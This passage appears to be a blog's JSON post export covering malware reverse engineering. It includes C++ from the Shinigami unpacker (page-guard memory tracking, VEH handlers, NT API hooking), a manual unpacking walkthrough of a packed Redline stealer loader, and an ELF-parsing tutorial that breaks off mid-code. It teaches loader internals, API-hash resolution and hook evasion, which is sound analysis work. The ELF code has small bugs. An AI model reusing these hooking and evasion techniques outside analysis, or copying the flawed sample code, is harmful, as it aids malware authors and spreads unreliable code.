attempted to write to an inaccessible address.” With that information, we are able to detect the type of access that occurred and its location. Now, let’s discuss this piece of code:pExceptionPointers-&gt;ContextRecord-&gt;EFlags |= 0x100;One aspect of the PAGE_GUARD mechanism is that immediately after the memory is accessed, the PAGE_GUARD flag is removed from the memory. Therefore, after completing our check code, we must decide whether the execution should continue. If it should, we need to instruct the CPU to perform a single step in the code. To achieve this, we turn on the TF (Trap Flag) to force the CPU to proceed with execution. The TF flag is stored in the EFLAGS register, and we can enable it by performing a bitwise OR operation with 0x100.Once the TF flag is enabled, another exception will be raised, this time with the type STATUS_SINGLE_STEP. This is the point where we make another decision: Do we want to continue monitoring this memory? If the answer is no, we can safely return the EXCEPTION_CONTINUE_EXECUTION value, indicating to the operating system that we have handled the exception and are ready to continue execution.In the provided example code, there is no need to continue monitoring the memory. However, in unpackers like Shinigami, this is the moment when we can use VirtualProtect again to insert the PAGE_GUARD bit and continue the monitoring process:// Shinigami STATUS_SINGLE_STEP handlerif (GenericUnpacker::cUnpacker.IsBeingMonitored((ULONG_PTR)ExceptionRecord-&gt;ExceptionAddress) &amp;&amp;\tGenericUnpacker::cUnpacker.IsBeingMonitored((ULONG_PTR)pExceptionPointers-&gt;ContextRecord-&gt;XIP)){\tVirtualQuery(ExceptionRecord-&gt;ExceptionAddress, &amp;mbi, 0x1000);\tmbi.Protect |= PAGE_GUARD;\tVirtualProtect(ExceptionRecord-&gt;ExceptionAddress, 0x1000, mbi.Protect, &amp;dwOldProt);}TestingPerfect! Now that the concept of page guards and exception handlers is clear, let’s proceed with the unpacker design, using Shinigami as a reference since it is the one that I developed.Overall Shinigami unpacker designSince we are working with malware loaders, one of the prominent aspects is memory allocation and memory protection manipulation. It is crucial for us to keep track of every memory region used by the target malware. Additionally, since our solution run in user mode, we don’t have access to the special powers that a kernel mode driver would have.One approach to address this is:  Create the malware process in a suspended state  Inject a DLL into the process, allowing us to hook into functions related to memory manipulation.          By doing so, we can intercept any memory allocation or modification that may lead to code execution, such as the use of PAGE_EXECUTE_READWRITE memory regions.            Append the PAGE_GUARD flag to these newly created/modified memory regions.    Finally, we can register a custom Vectorized Exception Handling (VEH) handler to monitor whether these memory areas are being used for execution.Hooking NT functions in UsermodeIn order to perform the hooking, you have the flexibility to choose any technique you prefer. In my case, I selected the trampoline approach. However, you also have the option to utilize VEH hooking in your implementation, VEH hooking does not require modifying the target function directly. Instead it utilizes the STATUS_GUARD_PAGE_VIOLATION exception handler to modify the process instruction pointer (IP) and redirect execution to your code. One advantage of VEH hooking is its ability to evade certain anti-hooking mechanisms that specifically check for jumps or modifications within the hooked function.NtAllocateVirtualMemoryWhen hooking the NtAllocateVirtualMemory function, we can leverage the fact that VirtualAlloc is a wrapper over it, this allows us to inspect the memory protections chosen for the newly allocated memory. If we detect that the memory is being allocated with any protections related to execution, we can append the PAGE_GUARD bit to it.// Code snnipet from https://github.com/buzzer-re/Shinigami/blob/666c2579e0c17c4272d8c5c11df6b2c4dc012de2/Shinigami/Ichigo/Unpacker.cpp#L19if ((ProcessHandle == NULL || GetProcessId(ProcessHandle) == GenericUnpacker::IchigoOptions-&gt;PID) &amp;&amp; (Protect == PAGE_EXECUTE_READWRITE || Protect == PAGE_EXECUTE_READ || Protect &amp; PAGE_EXECUTE)){\tProtect |= PAGE_GUARD;\tTrack = TRUE;}Then, we proceed with the regular invocation of the real function, allowing the memory allocation to take place. Simultaneously, we begin tracking the newly allocated address by storing relevant information in a data structure. In the case of Shinigami, an STL &lt;list&gt; is utilized as the data structure, holding some metadata about the allocated memory region (similar to previous example). This data structure is useful when searching the entire monitored memory of the loader for specific code or executables.NTSTATUS status = GenericUnpacker::cUnpacker.Win32Pointers.NtAllocateVirtualMemory(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);if (status == STATUS_SUCCESS &amp;&amp; Track){\tGenericUnpacker::cUnpacker.Watcher.push_back({});\tMemory&amp; memory  = GenericUnpacker::cUnpacker.Watcher.back();\tmemory.Addr     = reinterpret_cast&lt;uint8_t*&gt;(*BaseAddress);\tmemory.End      = reinterpret_cast&lt;ULONG_PTR&gt;(memory.Addr + AllocatedSize);\tmemory.Size     = AllocatedSize;\tmemory.prot     = Protect;\tPipeLogger::LogInfo(L\"Tracking newly allocated memory 0x%lx with protections 0x%x\", *BaseAddress, Protect);}Perfect! With our tracking mechanism in place, we can effectively monitor every request made by the malware for executable memory. Another important function to consider hooking is NtProtectVirtualMemory, which corresponds to the ultimate purpose of the VirtualProtect call. By intercepting and hooking this function, we gain insight into the protection changes made to virtual memory regions. This gives us the ability to analyze and potentially modify the protection settings as needed.NtProtectVirtualMemoryWhen it comes to changing memory protections, we can follow a similar approach to the one used for memory allocation. When the protections need to be modified, we examine the new protection settings to determine if they include any execution flags.if ((ProcessHandle == NULL || GetProcessId(ProcessHandle) == GenericUnpacker::IchigoOptions-&gt;PID) &amp;&amp; (NewProtect == PAGE_EXECUTE_READWRITE || NewProtect == PAGE_EXECUTE_READ || (NewProtect &amp; PAGE_EXECUTE))){\t// Add the PAGE_GUARD bit as well\tNewProtect |= PAGE_GUARD;\tTrack = TRUE;}NTSTATUS status = GenericUnpacker::cUnpacker.Win32Pointers.NtProtectVirtualMemory(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);That way, even if the protections were initially non-executable, they will still be tracked.However, it’s important to note that this approach has certain drawbacks and limitations. For instance, if the loader correctly maps the PE file in memory, certain parts of the memory may not be marked as executable and therefore won’t be tracked during the dumping process. This is a known issue in Shinigami, and it will be addressed in future releases to improve the tracking and monitoring of memory regions.VEH callback implementationOur exception handler implementation will be invoked whenever any of the tracked memory regions are accessed. Since our focus is on code execution, we will verify the exception address and the program’s instruction pointer. To facilitate the compilation of our program for both x86 and x64 platforms, we will define a macro.#ifdef _WIN64#define XIP Rip#else#define XIP Eip#endif(This simple macro idea was done by @fsx30, his article helped me to implement this handler btw.)case STATUS_GUARD_PAGE_VIOLATION:\t//\t// Verify if it's being monitored and executing\t//\tif (GenericUnpacker::cUnpacker.IsBeingMonitored((ULONG_PTR)ExceptionRecord-&gt;ExceptionAddress) &amp;&amp;\t\tGenericUnpacker::cUnpacker.IsBeingMonitored((ULONG_PTR)pExceptionPointers-&gt;ContextRecord-&gt;XIP))\t{\t\tPipeLogger::LogInfo(L\"STATUS_GUARD_PAGE_VIOLATION: Attempt to execute a monitored memory area at address 0x%lx, starting dumping...\", ExceptionRecord-&gt;ExceptionAddress);\t\tULONG_PTR StartAddress = (ULONG_PTR)pExceptionPointers-&gt;ContextRecord-&gt;XIP;\t\tMemory* Mem = GenericUnpacker::cUnpacker.IsBeingMonitored(StartAddress);\t\tif (GenericUnpacker::cUnpacker.Dump(Mem))\t\t{\t\t\tPipeLogger::Log(L\"Saved stage %d as %s \", GenericUnpacker::cUnpacker.StagesPath.size(), GenericUnpacker::cUnpacker.StagesPath.back().c_str());\t\t\tGenericUnpacker::cUnpacker.RemoveMonitor(Mem);\t\t}\t...Our first step is to verify if the faulted address falls within the range of the list that stores all allocated memory addresses. If it does, we retrieve the corresponding memory structure from the list, we are now prepared to proceed with the memory dumping process.Dumping techniquesThe approach you choose will depend on your specific requirements and analysis goals. In your case, you mentioned that you verify if the memory contains the DOS header. If it does, you rebuild the already mapped Portable Executable (PE) file to preserve section alignments. This video from OAlabs provides a good explanation of this process.However, if the memory does not contain the DOS header, you only dump the executed code and save it to disk as binname_shellcode_shellcodenum.bin. This approach can be useful in scenarios where you are specifically interested in analyzing shellcode execution.In general, this subject deserves another article dedicated to more in-depth memory dumping techniques, including heuristics and other advanced methods.PIMAGE_DOS_HEADER PEDumper::FindPE(Memory* Mem){    PIMAGE_DOS_HEADER pDosHeader;    PIMAGE_NT_HEADERS pNtHeader;    for (uint8_t* Curr = reinterpret_cast&lt;uint8_t*&gt;(Mem-&gt;Addr); (ULONG_PTR)Curr &lt; Mem-&gt;End; Curr++)    {        pDosHeader = reinterpret_cast&lt;PIMAGE_DOS_HEADER&gt;(Curr);        if (pDosHeader-&gt;e_magic == IMAGE_DOS_SIGNATURE)        {            pNtHeader = reinterpret_cast&lt;PIMAGE_NT_HEADERS&gt;((ULONG_PTR)pDosHeader + pDosHeader-&gt;e_lfanew);            if ((ULONG_PTR)pNtHeader &lt;= Mem-&gt;End - sizeof(pNtHeader) &amp;&amp;                 pNtHeader-&gt;Signature == IMAGE_NT_SIGNATURE)            {                return pDosHeader;            }        }    }    return nullptr;}Given a memory area, you can perform memory scanning until you find a region where both the DOS header and NT signature are present. Since we are examining the memory allocated by malware, we can confidently assert that we are dealing with an unpacked or loaded executable.TestingPerfect! With the comprehensive explanation provided, you now have a clear understanding of the spirit behind Shinigami. We are now ready to explore a use case.In this instance, we will examine a sample described in the post Manual Unpacking in Details. This sample aligns perfectly with our example as it involves a three-stage loading process, as follows:  The first shellcode is responsible for decrypting the executable and the second shellcode  The second shellcode handles the manual mapping of the executable.  Finally, the manual mapped executable is executed.Shinigami fits perfectally here:Certainly! To explore the full range of options available in the Shinigami project, you can visit the GitHub repository at here.Drawbacks and Future workAs mentioned earlier, there are some limitations and drawbacks to consider in this design. The primary drawback is that the current implementation relies entirely on user-mode execution and NT function hooking. This makes it susceptible to easy defeat through direct syscalls. To enhance the design, the addition of a helper driver to hook the System Service Descriptor Table (SSDT) and provide feedback on memory behavior in kernel mode would be beneficial.Another drawback, which is currently being addressed, is the memory monitoring algorithm. The approach of only monitoring executable memory can result in the exclusion of certain properly mapped PE files. To overcome this limitation, a solution is being developed that involves the creation of a shadow memory. This shadow memory will track all data written and allocated by the binary, utilizing the Vectorized Exception Handling (VEH) mechanism when a write fault occurs. Also I’m exploring optimizations to ensure efficient performance during this process.Also, anti-hooking techniques employed by malware with anti-EDR capabilities pose another challenge. While not currently under active development, ideas for mitigating these techniques include replacing trampoline functions with VEH hooking and exploring additional approaches. A detailed exploration of these techniques will be covered in a separate article.ConclusionI hope that you have found this research to be valuable for your work. The process of conducting this research has helped my understanding in various concepts, because practical experience is often more valuable than theoretical knowledge alone.I have a strong passion for anti-malware research, and as a result, I plan to contribute more content in this area. While there is already an abundance of resources available on malware development, there are limited materials related to anti-malware techniques and research.That’s it, thanks."
  },
  
  {
    "title": "Manual Unpacking in Details",
    "url": "/posts/Manual-unpacking-in-details/",
    "categories": "Reverse-Engineering",
    "tags": "Reverse Engineering, Malware Research",
    "date": "2023-03-20 19:10:00 -0300",
    





    
    "snippet": "Wow, it’s been more than two years since my last blog post. Time flies! But now, in 2023, I am eager to start filling this blog with cool and useful content, and I hope to maintain it for a long ti...",
    "content": "Wow, it’s been more than two years since my last blog post. Time flies! But now, in 2023, I am eager to start filling this blog with cool and useful content, and I hope to maintain it for a long time.As a welcome back post, I want to share an unpacking of a random sample of the Redline stealer that I found inside Malware Bazaar. The purpose of this post is not to analyze the malware, but rather to dive into the process of manual unpacking and extract deep information about the packer itself.While writing this post, I discovered that this is an updated version of the packer that was described by Fumik0, in 2021. Although there have been some minor changes to some of its components, I will still use this sample to demonstrate the unpacking process.Spliting the multi-stage loaderThis sample loads its final payload in a multi-stage procedure, which means that there are a couple of steps involved before the actual malware is executed.The bad, the good and the ugly unpack formulaMost of the unpacking is done by monitoring memory allocations, breaking at VirtualAlloc or LocalAlloc, and verifying any memory protection modifications with VirtualProtect and so on. However, for the purpose of this analysis, I want to focus on a more precise approach by examining the unpacking code itself.This means that we first need to reverse the binary statically and determine exactly where we should look. In most cases, you will find a shellcode for analysis. You can identify it by following the code flow until you encounter an indirect jump, a function pointer call in the decompiler view, or something like jump rax or call rax in the disassembler, it will not be always that easy but for in general if you are not dealing with code obfuscation that is the way to go.So, our steps for a successful unpacking will be as follows:  Locate where the shellcode will be executed.  Dump the raw shellcode.  Reconstruct the code inside IDA, define struct types, and understand what the code does.  Repeat the previous step for each stage of the unpacking process.  Fully recover the final binary.With that in mind, let’s get started!Finding where to stop                              Fig.1 Dead code and dummy code to distract analysis      This sample employs a lot of junk and unused functions. At first glance in (1), we can see that we are looking at functions that have no use at all. It’s common for malware to use obfuscators that insert dummy code flows and function calls.Also, note that in (2), some pointers are filled with data that is responsible for:  uBytes: the amount of bytes needed to allocate the shellcode memory  suspicious: the shellcode information struct, which we will talk about later.The juicy part is at sub_403340 (executeHiddenCode). Let’s dive in and search for any function pointer calls.Function pointers                              Fig.2 Function pointer call at the end      At the end of the function, it’s possible to see a call to a function pointer SomeHiddenFunction (dword_4B6B98). As it turns out, this memory region is allocated at runtime, and it’s fairly easy to find where using the xrefs:                              Fig.3 shows the memory assignment on the suspicious function pointer.      Looking at the references to this memory area, it’s pretty clear that we should at least look at the only place where there is an assignment to this memory area: mov SomeHiddenFunction, eax. From there, it’s possible to follow the code flow to understand how this function is built.                              Fig.4 Function memory allocation.      Indeed, the function is being allocated at runtime by using the LocalAlloc function. By looking at the xrefs to this allocation function, it’s possible to identify that the executeHiddenFunction is responsible for calling it.Later on, the memory area permissions are changed dynamically to allow code execution using the VirtualProtect function:                              Fig.5 Dynamic invocation of VirtualProtect to change memory permissions for shellcode execution      Shellcode structureDo you recall the suspicious variable mentioned earlier? It’s actually used as a trick to hide the real encrypted shellcode offset. The trick involves pointing to an invalid memory area and then adding a fixed value of 732475 to it, which ultimately points to the real shellcode blob array address.                                    Fig.6 Address pointed by the suspicious pointer      Fig.7 Address fixed and copying shellcode blob      In other words, the actual address of the shellcode starts at 0x35FAD5 + 732475 = 0x412810.                              Fig.8 Shellcode encrypted blob start      In my first analysis, I did not pay much attention to the encryption scheme used in this code, as I was able to easily dump the shellcode inside x64dbg by breaking at the SomeHiddenFunction call. However, after reading the article by Fumik0 which analyzes a similar packer, I realized that the encryption scheme used here is the same as in the other packer: the Tiny Encryption Algorithm TEA (Tiny Encryption Algorithm).TEA is a symmetric key block cipher with a block size of 64 bits, which was designed to be simple and easy to implement. It uses a 128-bit key to encrypt data in 64-bit blocks, and the same key is used for decryptionI’m not a cryptography expert so I can’t dive to much on this part, but here is where the decryption really happens:                              Fig.9 Decrypt prepare and wrapper      Due to the large amount of junk code and dummy function calls in the binary, I’ve highlighted only the real decryption code. With the decryption key properly set, the algorithm is able to decrypt the shellcode and execute it in memory.                              Fig.10 TEA algorithm core      Dumping the first shellcodeAs we have a good understand of the first shellcode stage of this loader, we can already dump it using x64dbg.                              Fig.10 Dumping the first shellcode stage      After triggering the breakpoint at call eax in someHiddenFunction(), we can navigate to where eax points on the dump tab and save the contents to a file. This will allow us to dump the first stage shellcode.Shellcode Analysis - Stage1The first stage shellcode is responsible for dynamically loading functions such as GetProcAddress and LoadLibraryA by parsing the Process Environment Block (PEB). It also uses API hashing to locate the DLL name and function name.To analyze the shellcode in IDA Pro, we need to load the necessary type libraries first. Here’s how to do it:  Open IDA Pro and load the target binary.  Go to “View” -&gt; “Sub views” -&gt; “Type libraries” or just Hit Shift + F11  Load the mssdk64_win10 and click “OK”To enhance your analysis, it is recommended to include the complete definitions of the PEB and _LDR_DATA_TABLE_ENTRY structures. You can quickly achieve this by importing the definitions from the ntdll.h file available in the x64dbg repository. Simply copy the content of ntdll.h as a local type in IDA Pro by using the shortcut Shift+F1 &gt; right click &gt; insert &gt; Ok, you will get some errors but that’s fine because you mostly will have a lot of structs in the local types view, mark everything with Ctrl+A and select “Synchronize to idb”.                              Fig.11 Including local types      Reversing the API resolver routineWhen the shellcode is opened in the decompiler view, several interesting things can be observed:                              Fig.12 Shellcode without further reversing        A suspicious function that takes two parameters that looks like a checksum/hash  An incremented and assigned pointer (a1)  A large number of API function names  The same pointer (a1) being accessed and called over and overFrom this information, it can be deduced that:  A1 is likely a struct  The sub_83 function probably performs some API hashing routine  The functions are likely loaded using GetProcAddressThe supposed API hashing function contains the following code without analysis:                              Fig.13 Raw code from the supposed API hashing function      Upon inspection of the code, it becomes evident that the InLoadOrderModuleList structure inside the PEB is being accessed. This structure represents a doubly linked list that stores the loaded modules of a process in the order they were loaded. Each element of the linked list is an LDR_DATA_TABLE_ENTRY structure, which contains useful information about the module such as its DLL name, base address, and other attributes.In addition, the code contains a few unresolved variables, which is a common occurrence when analyzing shellcode. To ensure precision, it is advisable to follow both the decompiler and disassembly views while rebuilding the code.This will enable us to redefine the structures accurately and produce a more comprehensive understanding of the code’s functionality.Rebuilding structs from the assembly view                              Fig.14 PEB access from the assembly view      In the assembly code, it’s possible to see that the PEB address is being pushed into the stack and poped in eax, later on eax is incremented to 0xC, with this we can start to rebuild the structures by marking the register+offset and pressed T, which allows us to search for each struct that match to that offset access:                              Fig.15 Rebuild structs from the assembly view      When rebuilding a shellcode, it’s important to ensure that you have all the necessary structs for the PE file and that they have the correct architecture. If you have already imported the type libraries, you can easily add the required structs by going to the ‘Structure’ tab, right-clicking and selecting ‘Add struct type’, and searching for the struct. In the case of a 32-bit shellcode, the following structs will be needed:  IMAGE_DOS_HEADER  IMAGE_NT_HEADERS32  IMAGE_OPTIONAL_HEADERS32  IMAGE_EXPORT_DIRECTORY  IMAGE_DATA_DIRECTORYThe retyped assembly code looks like:                              Fig.16 PEB parsing code retyped in the assembly view      From the code, it’s clear that the shellcode is parsing each loaded module, retrieving its name and sending it to a function with the first parameter (checksum1). If the checksum matches, it proceeds to parse the in-memory PE file to retrieve the export table information. Knowing this, we can apply the same types in the decompiler view to understand the code better. However, it’s important to note that some of the decompiler code may be broken, so it’s best to cross-check with the disassembly view:                              Fig.17 Decompiled code of the resolver      Great! So the resolving function utilizes the first parameter as a checksum to match the DLL name, and the second parameter for the exported function name. The checksum code itself is relatively simple. However, in order to determine which DLL and exported function is being searched, one would have to run the checksum code against all common Windows DLL files and their exported functions.                              Fig.18 String checksum code      Discovering API hashing values using HashDBLuckly for us there is an open-source project called HashDB that has already done the heavy lifting for us. It includes a collection of known API hashing algorithms and their respective values. In addition, there is an IDA Pro plugin available to assist with this task. If you are interested in learning more about it, check out this video.                              Fig.19 Matched algorithms using hashDB      I’ve choosen the shl1_add because this is not revil, but other algorithms may work as well (perhaps they use the same calculation). With knowledge of the algorithm, we can search for its values and determine that this checksum corresponds to the kernel32.dll module.                                     Fig.20 DLL match             Actually, there was a hash collision with the first argument, but if you open this dropdown you will find the KERNEL32.DLL in uppercase and other non-native libraries, so it must be kernel32. Repeating the same process for the second argument will reveal that it is the LoadLibraryA function!Now a cool feature of HashDB is that if there is a hit on a function name from a specific module, it can download ALL the hash values from that DLL for us and create an enum in the local types views. This enum can be used to automatically resolve everything at once, saving us time and effort.                              Fig.21 HashDB bulk import                                    Fig.22 HashDB created enum      Now with all this information collected, we can change the function signature and automatically the names will be associeted to the hash values:                              Fig.23 Changing the function signature                                    Fig.24 Resolved names discovered!      Rebuilding the Shellcode structPerfect, now that we already know what functions are being resolved we can proceed, the next step is to rebuild the a1 struct, this is likely the Shellcode struct that hold every important informationl in order to work. It’s pretty easy to create a struct if there are being have access to this pointer, just right click the a1 variable and hit create a new struct typeGreat! Now that we have identified what functions are being resolved we can proceed create a new struct definition for the a1 pointer. To create a new struct definition, simply right-click on the a1 variable, hit create a new struct type.Make sure to include all the necessary fields and data types based on the information we have gathered so far. Once the struct definition is created, you can use it to reference the fields of the a1 struct and understand the overall structure of the shellcode.                              Fig.25 Shellcode struct rebuilded      So, by rebuilding the shellcode struct, we can see that it contains all the necessary functions required for its proper functioning. With this information, we can now exit the function and move on to the next steps with a newly created struct type!                              Fig.26 Shellcode definition      The path to the last stageHaving access to the struct allows for replacement of all occurrences that use this structure. Once the API names have been resolved, a final function is executed to decrypt the next-stage shellcode and the actual packed PE file.                              Fig.27 Function without signature      As an example, consider this function that takes the previously discovered shellcode struct. Although the code may appear difficult to read, we can simply replace the function signature to expect a ShellcodeStruct parameter, which will clarify the code:                              Fig.28 Signature fixed and cleaned code      Now it is clear what will happen. The function will use CreateToolHelp32Snapshot to capture information about all loaded modules, but will only select the first one. However, upon closer examination, it becomes apparent that this is a decoy code since none of this information will be used.Instead, the DecryptAndExec function will allocate memory for the next stage, decrypt it and execute a direct jump to this area.                              Fig.29 Final function in the first stage loader      The DecryptAndExec function is a crucial component of the shellcode execution, this function accesses certain members of the ShellCodeStruct, but these are not relevant to our current analysis.The function then proceeds to allocate memory using the VirtualAlloc function, with the memory location being stored in the pNextStage pointer. This memory area will be used to hold the decrypted and copied next stage of the malware.With this knowledge of when the next stage will be executed, we can continue our analysis in x64dbg. By creating a signature for the jmp instruction inside the shellcode, we can place a breakpoint before the dump of the second stage. This will enable us to analyze the second stage of the malware’s execution and gain further insight into the capabilities and behavior of the malware.                              Fig.30 jump pattern signature to be used in debugger pattern scanning.      Dumping the last stageBy applying the pattern 8B 45 08 8B 40 04 8B 4D F4 89 08 FF 65 FC we will be able to find the jmp instruction showed earlier and also dump this second stage shellcode:                              Fig.31 Dumping the last stage using the jump signature      Perfect! Now, let me share a helpful tip to speed up the analysis process. As mentioned earlier, the final stage of the shellcode typically contains the unpacked PE file. Rather than dumping the entire memory content, it’s possible to extract only the PE file from the memory dump. This can save a considerable amount of time and resources:                              Fig.34 Dumping the PE file that resides in the last stage      Spoiler Alert: We’ve successfully unpacked the final stage!The last shellcode is responsible for manually mapping the PE file, importing all the dependencies, and jumping to the entry point. Once the PE file is unpacked, one can continue the analysis without wasting time with the packer.ConclusionTo sum it up, this article aimed to show a more professional and accurate manual unpacking method instead of relying on luck and common API breakpoints to find a PE file. While this packer was simple, other cases may not be so straightforward, such as when the MZ header is missing or there’s no PE file at all. However, this fundamental knowledge is still valuable.I’m thrilled to be back writing for the blog and look forward to publishing more articles, not only on malware reversing."
  },
  
  {
    "title": "Manipulating elf files in C++ using felf",
    "url": "/posts/Manipulating-elf-with-felf/",
    "categories": "Programming",
    "tags": "Programming, Reverse engineering",
    "date": "2020-11-30 15:00:36 -0300",
    





    
    "snippet": "A couple months ago I created felf, a library to parse ELF files into C++ structures, the reason for this was to have a way in C++ to work on ELF files using STL structures like vector, unordered m...",
    "content": "A couple months ago I created felf, a library to parse ELF files into C++ structures, the reason for this was to have a way in C++ to work on ELF files using STL structures like vector, unordered maps and so on.For this reason I wanna explore what was built and why, and show to you all the possibilities of this tiny yet nice library.Executable filesWhat’s this ?An executable file is designed to pack all information of a software into a single file that your OS will read, and do all the dirty work of mapping it’s code into memory and allocating resources that your CPU will use to execute.These files are part of your life, now more than ever. You can find them in your SmartTV, Videogames, IoT devices and Unix systemsThe ELF format is mainly used on Linux machines  but it it’s not the only one that exists PE is mainly used in Windows, Mach-o is used in MacOS systems. Although this article and library will be focused on ELF and Linux machines, all the knowledge is the same that you need to work with PE and Mach-O files.From disk to memoryImagine ELF files as a pre-fabricated home, the way the file is on disk contains almost the same structures that will be mapped in memory and the steps the OS has to follow to do so in a correct way.The structure is the follow:Everything is pretty straight forward:  A ELF header that holds the basic information of the file  A program header table that describes each segment of code that will be mapped  Sections that hold some data, like executable code, string table, symbol table and so on  Section header which is a array like structure that holds information about a given sectionELF Internal structuresEach of these structures are defined in elf.h and if you run man elf you will get it’s full documentation. Let’s start by parsing in ELF header from disk (without loading anything in memory yet).#define EI_NIDENT 16typedef struct {    unsigned char e_ident[EI_NIDENT];    uint16_t      e_type;    uint16_t      e_machine;    uint32_t      e_version;    ElfN_Addr     e_entry;    ElfN_Off      e_phoff;    ElfN_Off      e_shoff;    uint32_t      e_flags;    uint16_t      e_ehsize;    uint16_t      e_phentsize;    uint16_t      e_phnum;    uint16_t      e_shentsize;    uint16_t      e_shnum;    uint16_t      e_shstrndx;} ElfN_Ehdr;This struct specifies a structure equivalent to the first bytes of the file. Notice that we have a N in the variable name that can be used with 32 or 64 bits depending the OS and the file itself, the ELF header size can be 52 bytes in 32-bit files and 64 bytes in 64-bits files, you can verify that by looking the structs sizes:#include &lt;elf.h&gt;...printf(\"%d bytes\\n\", sizeof(Elf32_Ehdr)); // 52 bytesprintf(\"%d bytes\\n\", sizeof(Elf64_Ehdr)); // 64 bytesParsing the header from scratchAs my system currently is in 64 bits, I will first dump out the first 64 bytes of data from my disk and use BlobToChar to built a C array code with the header. With this dump I can load the header in my code and parse it quickly.First 64 bytes (Header):$ hexdump -C -n64 /usr/bin/ls                                                                                                   00000000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|00000010  03 00 3e 00 01 00 00 00  20 5b 00 00 00 00 00 00  |..&gt;..... [......|00000020  40 00 00 00 00 00 00 00  b0 23 02 00 00 00 00 00  |@........#......|00000030  00 00 00 00 40 00 38 00  0b 00 40 00 1b 00 1a 00  |....@.8...@.....|00000040Dumping on disk:$ dd if=/usr/bin/ls of=lselfheader bs=1 count=64                                                                           [130]64+0 records in64+0 records out64 bytes copied, 0.000510657 s, 125 kB/sLoad in code in C arrays:$ BlobToChar --blobname lselfheader                                                                                             unsigned char buff[] = {0x7f,0x45,0x4c,0x46,0x2,0x1,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x3,0x0,0x3e,0x0,0x1,0x0,0x0,0x0,0x20,0x5b,0x0,0x0,0x0,0x0,0x0,0x0,0x40,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0xb0,0x23,0x2,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x40,0x0,0x38,0x0,0xb,0x0,0x40,0x0,0x1b,0x0,0x1a,0x0,};unsigned int buff_size = 64;The parse code can be written as:#include &lt;elf.h&gt;#include &lt;stdio.h&gt;unsigned char buff[] = {0x7f,0x45,0x4c,0x46,0x2,0x1,0x1,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x3,0x0,0x3e,0x0,0x1,0x0,0x0,0x0,0x20,0x5b,0x0,0x0,0x0,0x0,0x0,0x0,0x40,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0xb0,0x23,0x2,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x40,0x0,0x38,0x0,0xb,0x0,0x40,0x0,0x1b,0x0,0x1a,0x0,};unsigned int buff_size = 64;int main(int argc, char** argv){\tElf64_Ehdr* elfHeader = (Elf64_Ehdr*) buff;\tprintf(\"e_ident: %s\\n\", elfHeader-&gt;e_ident);}As structs are just aligned bytes in memory, we can use the struct Elf64_Ehdr to parse these raw bytes, with this we can access the elf header internal struct. In the above example I printed the e_indent, which is an array with some basic information on the file itself, stored in the first 16 bytes of the buf variable. The very first 4 bytes: 0x7f,0x45,0x4c,0x46 contains the ‘ELF’ string starting from the second position.~ &gt;&gt;&gt; ./parseheader                                                                              Magic: ELFKnowing that, we can now parse the whole file by reading the file itself and use the ELF structs to extract the executable data itself.Example: Patching sections namesLet’s make a cool example, let’s change the .text section name to another thing. This section holds all the executable code in the file.In order to make that possible, we need to have access to the string table struct, which holds an array of strings with the 0x00 byte as delimiter.As the string table is just one portion of data in the file, it’s defined as a normal section and the struct in x64 elf is:typedef struct {    uint32_t   sh_name;    uint32_t   sh_type;    uint64_t   sh_flags;    Elf64_Addr sh_addr;    Elf64_Off  sh_offset;    uint64_t   sh_size;    uint32_t   sh_link;    uint32_t   sh_info;    uint64_t   sh_addralign;    uint64_t   sh_entsize;} Elf64_Shdr;With this struct in our hands, we just need to get the index of the section name (sh_name) and change it to something else. Notice that if we want to make the name greater or less then the real one, we will have to resize this array and change all the sections and address information to maintain the file integrity, in order to make this simple as possible I will just change the .text name to .etxt.Loading the entire file in memoryBefore we continue, let’s make some real code for this task and for that we need to load the file data in our memory, just like a loader would.To map files in memory in Linux, we will use the function mmap that will create a in memory mapping to a given file descriptor.Function definition: #include &lt;sys/mman.h&gt;void *mmap(void *addr, size_t len, int prot, int flags,             int fildes, off_t off);Using this idea, take a look in the following code to load our ELF file and dump the header, we will use this piece of code for the example part:#include &lt;elf.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/mman.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;int main(int argc, char** argv){\t\tif (argc != 2) {\t\tfprintf(stderr, \"Usage: %s &lt;elf_path&gt;\\n\", argv[0]);\t\treturn 1;\t}\tconst char* elf_path = argv[1];\tint file_fd = open(elf_path, O_RDWR); // Open in read and write\tif (!file_fd) return 1;\t\tstruct stat st; // Get file size using stat function\tstat(elf_path, &amp;st);\tunsigned file_size = st.st_size;\t// Map the current file descritor in any address in ours memory maps with size &lt;file_size&gt;\tvoid* addr = mmap(NULL, file_size, O_RDWR, MAP_SHARED, file_fd, 0);\t\tif (!addr) return 1;\t\t\t\t// Now we can work the new memory space using the raw address\tElf64_Ehdr* elf_header = (Elf64_Ehdr*) addr;\tputs(\"elf-&gt;e_indent: \");\tfor (int i = 0; i &lt; EI_NIDENT; ++i) {\t\tprintf(\"\\t0x%x(%c)\\n\", elf_header-&gt;e_ident[i], elf_header-&gt;e_ident[i]);\t}\t// Unmap the values\t\tmunmap(addr,file_size);\t// Close the file descriptor\tclose(file_fd);\treturn 0;}If you compile the code above, you will get something like:elf-&gt;e_indent: \t0x7f()\t0x45(E)\t0x4c(L)\t0x46(F)\t0x2()    ...Finding the section string tableOk, now let’s start the real job to get the section named .text. In order to accomplish that we need the first entry in the section array structure and get the total bytes used by this array, all this information can be found in the following field of the elf header:  e_shnum - Holds the number of sections that our ELF file has  e_shentsize - Holds the total raw size of each section  e_shoff - Holds the offset of the first entry in the arrayKnowing all that, we can calculate where the section array starts by getting the address of the mapped file + the e_shoff and then create a for loop where each “jump” is the index * e_shentsize, that way we can jump in each element of the array, after reaching the .text section we can get where in the string table it’s name is defined.Elf64_Ehdr* elf_header = (Elf64_Ehdr*) addr;uint16_t num_sections = elf_header-&gt;e_shnum;uint16_t section_size = elf_header-&gt;e_shentsize;Elf64_Off section_entry_offset = elf_header-&gt;e_shoff;printf(\"%d Sections, with %d bytes each and starting at address 